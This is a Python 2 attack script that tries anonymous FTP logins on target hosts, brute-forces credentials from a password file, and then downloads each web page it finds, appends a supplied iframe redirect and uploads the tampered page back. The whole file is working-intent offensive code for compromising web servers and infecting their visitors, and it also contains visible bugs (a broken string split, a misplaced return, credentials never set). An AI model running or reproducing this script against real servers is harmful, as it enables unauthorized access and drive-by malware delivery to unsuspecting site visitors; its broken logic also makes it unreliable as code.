import ftplib
import optparse
import time


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'
        return False


def brute_login(hostname, password_file):
    p_f = open(password_file, 'r')
    for line in p_f.readlines():
        time.sleep(1)
        username = line.split(':')[0]
        password = line.split(':')[1].split('\r').split('\n')
        print '[+] Trying: ' + username + '/' + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + \
                                            + username + '/' + password
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass
        print '\n [*] Could not brute force FTP credentials.'
        return (None, None)


def return_default(ftp):
    try:
        dir_list = ftp.nlst()
    except:
        dir_list = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping to next target'
        return
    ret_list = []
    for filename in dir_list:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + filename
            ret_list.append(filename)
    return ret_list


def inject_page(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected iframe on: ' +page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded inject: ' + page


def attack(username, password, tgt_host, redirect):
    ftp = ftplib.FTP(tgt_host)
    ftp.login(username,password)
    def_pages = return_default(ftp)
    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)


def main():
    parser = optparse.OptionParser('usage %prog -H <target host[s]>'
                                   '-r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest='hostnames', type='string',
                      help='specify target hostname')
    parser.add_option('-r', dest='redirect', type='string',
                      help='specify redirect page')
    parser.add_option('-f', dest='passwd_file', type='string',
                      help='specify user:password file')
    (options, args) = parser.parse_args()
    tgt_hosts = str(options.hostnames).split(', ')
    password_file = options.passwd_file
    redirect = options.redirect
    if tgt_hosts == None or redirect == None:
        print parser.usage
        exit(0)
    for tgt_host in tgt_hosts:
        username = None
        password = None
        if anon_login(tgt_host) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using anonymous credentials'
            attack (username, password, tgt_host, redirect)
        elif password_file != None:
            print '[+] Using creds: ' + username + '/' + password
            attack(username, password, tgt_host, redirect)


if __name__ == '__main__':
    main()